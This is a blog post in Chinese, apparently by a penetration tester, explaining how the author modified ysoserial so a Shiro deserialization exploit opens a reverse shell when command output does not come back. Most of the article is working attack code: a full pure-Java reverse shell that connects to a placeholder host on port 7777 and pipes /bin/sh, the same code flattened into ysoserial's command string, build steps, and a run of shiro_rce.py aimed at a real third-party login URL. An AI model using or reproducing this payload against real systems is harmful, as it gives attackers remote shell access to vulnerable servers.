@@ -1,0 +1,353 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="最近项目中碰到了两个shiro反序列化，能出网反弹shell失败的情况，和公司师傅请教了一下，豁然开朗，修改了一下ysoserial的一些源码，也成功打通了改动的仓库https:&#x2F;&#x2F;github.com&#x2F;Kit4y&#x2F;shuyu-ysoserial打包版本https:&#x2F;&#x2F;github.com&#x2F;Kit4y&#x2F;Awesome_shiro&#x2F;tree&#x2F;master&#x2F;shiro_s">
+<meta property="og:type" content="article">
+<meta property="og:title" content="JAVA4-改写ysoserial解决常规shell失效问题">
+<meta property="og:url" content="http://example.com/2020/06/17/JAVA4-%E6%94%B9%E5%86%99ysoserial%E8%A7%A3%E5%86%B3%E5%B8%B8%E8%A7%84shell%E5%A4%B1%E6%95%88%E9%97%AE%E9%A2%98/index.html">
+<meta property="og:site_name" content="书鱼">
+<meta property="og:description" content="最近项目中碰到了两个shiro反序列化，能出网反弹shell失败的情况，和公司师傅请教了一下，豁然开朗，修改了一下ysoserial的一些源码，也成功打通了改动的仓库https:&#x2F;&#x2F;github.com&#x2F;Kit4y&#x2F;shuyu-ysoserial打包版本https:&#x2F;&#x2F;github.com&#x2F;Kit4y&#x2F;Awesome_shiro&#x2F;tree&#x2F;master&#x2F;shiro_s">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://example.com/2020/06/17/JAVA4-%E6%94%B9%E5%86%99ysoserial%E8%A7%A3%E5%86%B3%E5%B8%B8%E8%A7%84shell%E5%A4%B1%E6%95%88%E9%97%AE%E9%A2%98/1.png">
+<meta property="og:image" content="http://example.com/2020/06/17/JAVA4-%E6%94%B9%E5%86%99ysoserial%E8%A7%A3%E5%86%B3%E5%B8%B8%E8%A7%84shell%E5%A4%B1%E6%95%88%E9%97%AE%E9%A2%98/4.png">
+<meta property="og:image" content="http://example.com/2020/06/17/JAVA4-%E6%94%B9%E5%86%99ysoserial%E8%A7%A3%E5%86%B3%E5%B8%B8%E8%A7%84shell%E5%A4%B1%E6%95%88%E9%97%AE%E9%A2%98/2.png">
+<meta property="og:image" content="http://example.com/2020/06/17/JAVA4-%E6%94%B9%E5%86%99ysoserial%E8%A7%A3%E5%86%B3%E5%B8%B8%E8%A7%84shell%E5%A4%B1%E6%95%88%E9%97%AE%E9%A2%98/5.png">
+<meta property="og:image" content="http://example.com/2020/06/17/JAVA4-%E6%94%B9%E5%86%99ysoserial%E8%A7%A3%E5%86%B3%E5%B8%B8%E8%A7%84shell%E5%A4%B1%E6%95%88%E9%97%AE%E9%A2%98/6.png">
+<meta property="og:image" content="http://example.com/2020/06/17/JAVA4-%E6%94%B9%E5%86%99ysoserial%E8%A7%A3%E5%86%B3%E5%B8%B8%E8%A7%84shell%E5%A4%B1%E6%95%88%E9%97%AE%E9%A2%98/7.png">
+<meta property="article:published_time" content="2020-06-17T07:16:11.000Z">
+<meta property="article:modified_time" content="2020-11-24T04:50:24.000Z">
+<meta property="article:author" content="Bkfish">
+<meta property="article:tag" content="Java">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/2020/06/17/JAVA4-%E6%94%B9%E5%86%99ysoserial%E8%A7%A3%E5%86%B3%E5%B8%B8%E8%A7%84shell%E5%A4%B1%E6%95%88%E9%97%AE%E9%A2%98/1.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>JAVA4-改写ysoserial解决常规shell失效问题</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/tags/">Tag</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="Previous post" href="/2020/10/04/%E5%BA%9F%E7%89%A9%E5%88%A9%E7%94%A8%E4%B9%8B%E5%88%A9%E7%94%A8%E4%B8%80%E5%8F%B0%E5%BA%9F%E5%BC%83%E7%AC%94%E8%AE%B0%E6%9C%AC%E5%BF%AB%E9%80%9F%E6%90%AD%E5%BB%BACTF%E5%AE%9E%E9%AA%8C%E5%AE%A4%E5%9F%BA%E7%A1%80%E5%BB%BA%E8%AE%BE/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2020/05/29/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%85%A5%E9%97%A83-ysoserial%E8%B0%83%E8%AF%95%E5%92%8C%E6%9E%84%E9%80%A0URLDNS%E7%9A%84pop%E9%93%BE/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2020/06/17/JAVA4-%E6%94%B9%E5%86%99ysoserial%E8%A7%A3%E5%86%B3%E5%B8%B8%E8%A7%84shell%E5%A4%B1%E6%95%88%E9%97%AE%E9%A2%98/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2020/06/17/JAVA4-%E6%94%B9%E5%86%99ysoserial%E8%A7%A3%E5%86%B3%E5%B8%B8%E8%A7%84shell%E5%A4%B1%E6%95%88%E9%97%AE%E9%A2%98/&text=JAVA4-改写ysoserial解决常规shell失效问题"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2020/06/17/JAVA4-%E6%94%B9%E5%86%99ysoserial%E8%A7%A3%E5%86%B3%E5%B8%B8%E8%A7%84shell%E5%A4%B1%E6%95%88%E9%97%AE%E9%A2%98/&title=JAVA4-改写ysoserial解决常规shell失效问题"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2020/06/17/JAVA4-%E6%94%B9%E5%86%99ysoserial%E8%A7%A3%E5%86%B3%E5%B8%B8%E8%A7%84shell%E5%A4%B1%E6%95%88%E9%97%AE%E9%A2%98/&is_video=false&description=JAVA4-改写ysoserial解决常规shell失效问题"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=JAVA4-改写ysoserial解决常规shell失效问题&body=Check out this article: http://example.com/2020/06/17/JAVA4-%E6%94%B9%E5%86%99ysoserial%E8%A7%A3%E5%86%B3%E5%B8%B8%E8%A7%84shell%E5%A4%B1%E6%95%88%E9%97%AE%E9%A2%98/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2020/06/17/JAVA4-%E6%94%B9%E5%86%99ysoserial%E8%A7%A3%E5%86%B3%E5%B8%B8%E8%A7%84shell%E5%A4%B1%E6%95%88%E9%97%AE%E9%A2%98/&title=JAVA4-改写ysoserial解决常规shell失效问题"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2020/06/17/JAVA4-%E6%94%B9%E5%86%99ysoserial%E8%A7%A3%E5%86%B3%E5%B8%B8%E8%A7%84shell%E5%A4%B1%E6%95%88%E9%97%AE%E9%A2%98/&title=JAVA4-改写ysoserial解决常规shell失效问题"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2020/06/17/JAVA4-%E6%94%B9%E5%86%99ysoserial%E8%A7%A3%E5%86%B3%E5%B8%B8%E8%A7%84shell%E5%A4%B1%E6%95%88%E9%97%AE%E9%A2%98/&title=JAVA4-改写ysoserial解决常规shell失效问题"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2020/06/17/JAVA4-%E6%94%B9%E5%86%99ysoserial%E8%A7%A3%E5%86%B3%E5%B8%B8%E8%A7%84shell%E5%A4%B1%E6%95%88%E9%97%AE%E9%A2%98/&title=JAVA4-改写ysoserial解决常规shell失效问题"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2020/06/17/JAVA4-%E6%94%B9%E5%86%99ysoserial%E8%A7%A3%E5%86%B3%E5%B8%B8%E8%A7%84shell%E5%A4%B1%E6%95%88%E9%97%AE%E9%A2%98/&name=JAVA4-改写ysoserial解决常规shell失效问题&description=&lt;p&gt;最近项目中碰到了两个shiro反序列化，能出网反弹shell失败的情况，和公司师傅请教了一下，豁然开朗，修改了一下ysoserial的一些源码，也成功打通了&lt;br&gt;改动的仓库&lt;a href=&#34;https://github.com/Kit4y/shuyu-ysoserial&#34;&gt;https://github.com/Kit4y/shuyu-ysoserial&lt;/a&gt;&lt;br&gt;打包版本&lt;a href=&#34;https://github.com/Kit4y/Awesome_shiro/tree/master/shiro_shuyu&#34;&gt;https://github.com/Kit4y/Awesome_shiro&amp;#x2F;tree&amp;#x2F;master&amp;#x2F;shiro_shuyu&lt;/a&gt;&lt;/p&gt;
+&lt;h2 id=&#34;为什么之前打不通？&#34;&gt;&lt;a href=&#34;#为什么之前打不通？&#34; class=&#34;headerlink&#34; title=&#34;为什么之前打不通？&#34;&gt;&lt;/a&gt;为什么之前打不通？&lt;/h2&gt;&lt;p&gt;两次项目均是这种情况，可以出网，可以反弹shell,但是命令执行就是没有回显&lt;/p&gt;"><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2020/06/17/JAVA4-%E6%94%B9%E5%86%99ysoserial%E8%A7%A3%E5%86%B3%E5%B8%B8%E8%A7%84shell%E5%A4%B1%E6%95%88%E9%97%AE%E9%A2%98/&t=JAVA4-改写ysoserial解决常规shell失效问题"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%BA%E4%BB%80%E4%B9%88%E4%B9%8B%E5%89%8D%E6%89%93%E4%B8%8D%E9%80%9A%EF%BC%9F"><span class="toc-number">1.</span> <span class="toc-text">为什么之前打不通？</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#java%E5%8E%9F%E7%94%9FSocket-shell"><span class="toc-number">2.</span> <span class="toc-text">java原生Socket_shell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A4%8D%E5%85%A5%E4%BB%A3%E7%A0%81%E9%97%AE%E9%A2%98-%E5%A6%82%E6%9E%9C%E5%8F%AA%E7%9C%8B%E7%BB%93%E6%9E%9C%E5%8F%AF%E4%BB%A5%E8%B7%B3%E8%BF%87%E8%BF%99%E4%B8%80%E6%AE%B5"><span class="toc-number">3.</span> <span class="toc-text">植入代码问题(如果只看结果可以跳过这一段)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BC%98%E5%8C%96"><span class="toc-number">4.</span> <span class="toc-text">优化</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%84%9F%E8%A7%A6"><span class="toc-number">5.</span> <span class="toc-text">感触</span></a></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        JAVA4-改写ysoserial解决常规shell失效问题
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">Bkfish</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2020-06-17T07:16:11.000Z" class="dt-published" itemprop="datePublished">2020-06-17</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fa-solid fa-archive"></i>
+        <a class="category-link" href="/categories/java%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/">java安全研究</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/Java/" rel="tag">Java</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <p>最近项目中碰到了两个shiro反序列化，能出网反弹shell失败的情况，和公司师傅请教了一下，豁然开朗，修改了一下ysoserial的一些源码，也成功打通了<br>改动的仓库<a target="_blank" rel="noopener" href="https://github.com/Kit4y/shuyu-ysoserial">https://github.com/Kit4y/shuyu-ysoserial</a><br>打包版本<a target="_blank" rel="noopener" href="https://github.com/Kit4y/Awesome_shiro/tree/master/shiro_shuyu">https://github.com/Kit4y/Awesome_shiro&#x2F;tree&#x2F;master&#x2F;shiro_shuyu</a></p>
+<h2 id="为什么之前打不通？"><a href="#为什么之前打不通？" class="headerlink" title="为什么之前打不通？"></a>为什么之前打不通？</h2><p>两次项目均是这种情况，可以出网，可以反弹shell,但是命令执行就是没有回显</p>
+<span id="more"></span>
+
+
+<p><img src="/2020/06/17/JAVA4-%E6%94%B9%E5%86%99ysoserial%E8%A7%A3%E5%86%B3%E5%B8%B8%E8%A7%84shell%E5%A4%B1%E6%95%88%E9%97%AE%E9%A2%98/1.png"></p>
+<p>在前文中，我们捋了一下yso项目的结构<a href="/2020/05/29/java-dai-ma-shen-ji-ru-men-3-ysoserial-diao-shi-he-gou-zao-urldns-de-pop-lian/">JAVA3-ysoserial调试和构造URLDNS的pop链</a>,再看一下yso的项目框架</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">│  GeneratePayload.java &#123;&#123;生成poc的入口函数&#125;&#125;</span><br><span class="line">│  Deserializer.java &#123;&#123;反序列化模块&#125;&#125;</span><br><span class="line">│  Serializer.java &#123;&#123;序列化模块&#125;&#125;</span><br><span class="line">│  Strings.java &#123;&#123;字符处理模块&#125;&#125;</span><br><span class="line">│</span><br><span class="line">├─exploit &#123;&#123;一些直接调用的exp&#125;&#125;</span><br><span class="line">│      JBoss.java</span><br><span class="line">│      JenkinsCLI.java</span><br><span class="line">│      JenkinsListener.java</span><br><span class="line">│      ......</span><br><span class="line">│ </span><br><span class="line">├─payloads &#123;&#123;生成gadget poc的代码&#125;&#125;</span><br><span class="line">│  │  CommonsBeanutils1.java</span><br><span class="line">│  │  URLDNS.java</span><br><span class="line">│  │  .....</span><br><span class="line">│  │</span><br><span class="line">│  ├─annotation &#123;&#123;一些不重要的配置&#125;&#125;</span><br><span class="line">│  │      Authors.java</span><br><span class="line">│  │</span><br><span class="line">│  └─util  &#123;&#123;一些重复使用的单元&#125;&#125;</span><br><span class="line">│          ClassFiles.java</span><br><span class="line">│          Gadgets.java</span><br><span class="line">│</span><br><span class="line">└─secmgr &#123;&#123;和安全有关的管理&#125;&#125;</span><br><span class="line">        DelegateSecurityManager.java</span><br><span class="line">        ExecCheckingSecurityManager.java</span><br></pre></td></tr></table></figure>
+<p>通过点追踪，我们找命令执行的拼接片段在ysoserial\payloads\util\ Gadgets.java<br><img src="/2020/06/17/JAVA4-%E6%94%B9%E5%86%99ysoserial%E8%A7%A3%E5%86%B3%E5%B8%B8%E8%A7%84shell%E5%A4%B1%E6%95%88%E9%97%AE%E9%A2%98/4.png"><br>命令是通过</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">String cmd=<span class="string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;&quot;</span> +</span><br><span class="line">            command.replaceAll(<span class="string">&quot;\\\\&quot;</span>,<span class="string">&quot;\\\\\\\\&quot;</span>).replaceAll(<span class="string">&quot;\&quot;&quot;</span>, <span class="string">&quot;\\\&quot;&quot;</span>) + <span class="string">&quot;\&quot;);&quot;</span>;</span><br></pre></td></tr></table></figure>
+<p>也就是<a target="_blank" rel="noopener" href="https://github.com/Kit4y/shuyu-ysoserial/blob/master/src/main/java/ysoserial/payloads/util/Gadgets.java">https://github.com/Kit4y/shuyu-ysoserial/blob/master/src/main/java/ysoserial/payloads/util/Gadgets.java</a>这里的120行左右<br>拼接，然后作者在代码上注释了一行有意思的话</p>
+<blockquote>
+<p>&#x2F;&#x2F; TODO: could also do fun things like injecting a pure-java rev&#x2F;bind-shell to bypass naive protections</p>
+</blockquote>
+<p>很明白了，我们可以改成自己的纯java的片段，简直为所欲为，所以我们也打算对他下手了。</p>
+<h2 id="java原生Socket-shell"><a href="#java原生Socket-shell" class="headerlink" title="java原生Socket_shell"></a>java原生Socket_shell</h2><p>这个不多说网上都有,这里为了反序列化，将所有的函数写上完整的包路径，比如java.net.Socket,java.io.IOException</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">rce</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> java.io.IOException, InterruptedException &#123;</span><br><span class="line">        String host=<span class="string">&quot;XXX.XXX.XXX.XXX&quot;</span>;</span><br><span class="line">        <span class="type">int</span> port=<span class="number">7777</span>;</span><br><span class="line">        String cmd=<span class="string">&quot;/bin/sh&quot;</span>;</span><br><span class="line">        Process p=<span class="keyword">new</span> <span class="title class_">ProcessBuilder</span>(cmd).redirectErrorStream(<span class="literal">true</span>).start();</span><br><span class="line">        java.net.Socket s=<span class="keyword">new</span> <span class="title class_">java</span>.net.Socket(host,port);</span><br><span class="line">        java.io.InputStream pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream();</span><br><span class="line">        java.io.OutputStream po=p.getOutputStream(),so=s.getOutputStream();</span><br><span class="line">        <span class="keyword">while</span>(!s.isClosed()) &#123;</span><br><span class="line">            <span class="keyword">while</span>(pi.available()&gt;<span class="number">0</span>) &#123;</span><br><span class="line">                so.write(pi.read());</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">while</span>(pe.available()&gt;<span class="number">0</span>) &#123;</span><br><span class="line">                so.write(pe.read());</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">while</span>(si.available()&gt;<span class="number">0</span>) &#123;</span><br><span class="line">                po.write(si.read());</span><br><span class="line">            &#125;</span><br><span class="line">            so.flush();</span><br><span class="line">            po.flush();</span><br><span class="line">            Thread.sleep(<span class="number">50</span>);</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                p.exitValue();</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;;</span><br><span class="line">        p.destroy();</span><br><span class="line">        s.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>可以编译运行一下测试<br><img src="/2020/06/17/JAVA4-%E6%94%B9%E5%86%99ysoserial%E8%A7%A3%E5%86%B3%E5%B8%B8%E8%A7%84shell%E5%A4%B1%E6%95%88%E9%97%AE%E9%A2%98/2.png"></p>
+<h2 id="植入代码问题-如果只看结果可以跳过这一段"><a href="#植入代码问题-如果只看结果可以跳过这一段" class="headerlink" title="植入代码问题(如果只看结果可以跳过这一段)"></a>植入代码问题(如果只看结果可以跳过这一段)</h2><p>因为这是java,理论上直接讲我们socket的shell换行符删除，应该就能直接运行<br>于是将cmd改成暂时写死的的反弹shell代码片</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmd=&quot; String host=\&quot;XXX.XXX.XXX.XXX\&quot;;int port=7777;String cmd=\&quot;/bin/sh\&quot;;Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();java.net.Socket s=new java.net.Socket(host,port);java.io.InputStream pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream();java.io.OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()) &#123;while(pi.available()&gt;0) &#123;so.write(pi.read());&#125;while(pe.available()&gt;0) &#123;so.write(pe.read());&#125;while(si.available()&gt;0) &#123;po.write(si.read());&#125;so.flush();po.flush();try &#123;p.exitValue();break;&#125;catch (Exception e)&#123;&#125;&#125;;p.destroy();s.close();&quot;</span><br></pre></td></tr></table></figure>
+<p>果不其然直接报错<br><img src="/2020/06/17/JAVA4-%E6%94%B9%E5%86%99ysoserial%E8%A7%A3%E5%86%B3%E5%B8%B8%E8%A7%84shell%E5%A4%B1%E6%95%88%E9%97%AE%E9%A2%98/5.png"><br>看了很久这个报错，问了一下师傅（Orz长亭师傅是真的顶<br>原因在ProcessBuilder的构造<br>报错说<code>[source error] cannot find constructor java.lang.ProcessBuilder(java.lang.String)</code>意味着字符串当参数就不能反序列化了，我们查看ProcessBuilder源码</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">    * Constructs a process builder with the specified operating</span></span><br><span class="line"><span class="comment">    * system program and arguments.  This is a convenience</span></span><br><span class="line"><span class="comment">    * constructor that sets the process builder&#x27;s command to a string</span></span><br><span class="line"><span class="comment">    * list containing the same strings as the &#123;<span class="doctag">@code</span> command&#125;</span></span><br><span class="line"><span class="comment">    * array, in the same order.  It is not checked whether</span></span><br><span class="line"><span class="comment">    * &#123;<span class="doctag">@code</span> command&#125; corresponds to a valid operating system</span></span><br><span class="line"><span class="comment">    * command.</span></span><br><span class="line"><span class="comment">    *</span></span><br><span class="line"><span class="comment">    * <span class="doctag">@param</span> command a string array containing the program and its arguments</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"><span class="keyword">public</span> <span class="title function_">ProcessBuilder</span><span class="params">(String... command)</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>.command = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;(command.length);</span><br><span class="line">    <span class="keyword">for</span> (String arg : command)</span><br><span class="line">        <span class="built_in">this</span>.command.add(arg);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>原来这里应该改成字符串数组，于是我们可以把<code> String cmd=&quot;/bin/sh&quot;;</code>改成<code>String[] cmd=new String[]&#123;\&quot;/bin/sh\&quot;&#125;</code>(军先师傅tql,<br>还有一个是Thread.sleep(50);也报错了，我们先直接删除</p>
+<p>然后重新mvn打包-生成ysoserial.jar打一下试试</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">jar ：mvn clean install -Dmaven.test.skip=true</span><br><span class="line">war：mvn clean package -Dmaven.test.skip=true</span><br></pre></td></tr></table></figure>
+<p>ok-成功打通了！<br><img src="/2020/06/17/JAVA4-%E6%94%B9%E5%86%99ysoserial%E8%A7%A3%E5%86%B3%E5%B8%B8%E8%A7%84shell%E5%A4%B1%E6%95%88%E9%97%AE%E9%A2%98/6.png"></p>
+<h2 id="优化"><a href="#优化" class="headerlink" title="优化"></a>优化</h2><p>现在我们只要把ip和端口写活着即可,因为暂时不想改整体框架的内容，就直接将command改了一下-懒癌是这样的，随手一改</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"> String[] cmds = command.split(<span class="string">&quot; &quot;</span>);</span><br><span class="line">String ip=cmds[<span class="number">0</span>];</span><br><span class="line">String port=cmds[<span class="number">1</span>];</span><br><span class="line">String cmd=<span class="string">&quot;String host=\&quot;&quot;</span>+ip+<span class="string">&quot;\&quot;;int port=&quot;</span>+port+<span class="string">&quot;;String[] cmd=new String[]&#123;\&quot;/bin/sh\&quot;&#125;;Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();java.net.Socket s=new java.net.Socket(host,port);java.io.InputStream pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream();java.io.OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()) &#123;while(pi.available()&gt;0) &#123;so.write(pi.read());&#125;while(pe.available()&gt;0) &#123;so.write(pe.read());&#125;while(si.available()&gt;0) &#123;po.write(si.read());&#125;so.flush();po.flush();try &#123;p.exitValue();break;&#125;catch (Exception e)&#123;&#125;&#125;;p.destroy();s.close();&quot;</span>;    </span><br></pre></td></tr></table></figure>
+<p><a target="_blank" rel="noopener" href="https://github.com/Kit4y/Awesome_shiro/tree/master/shiro_shuyu">https://github.com/Kit4y/Awesome_shiro&#x2F;tree&#x2F;master&#x2F;shiro_shuyu</a><br>尝试运行一下<br><code>python3 shiro_rce.py http://www.baidu.com/login.do &quot;xxx.xxx.xx.xx 7777&quot;</code><br><img src="/2020/06/17/JAVA4-%E6%94%B9%E5%86%99ysoserial%E8%A7%A3%E5%86%B3%E5%B8%B8%E8%A7%84shell%E5%A4%B1%E6%95%88%E9%97%AE%E9%A2%98/7.png"></p>
+<h2 id="感触"><a href="#感触" class="headerlink" title="感触"></a>感触</h2><p>学习java项目，研究源码是最直接最深触的学习途径，比去什么垃圾教程上看好多了。不仅可以看到项目如何跑，还能膜一下大佬们怎么写优雅的代码。通过修改源码改成自己顺手的工具也是一个不错的学习过程。Orz长亭师傅tql</p>
+
+  </div>
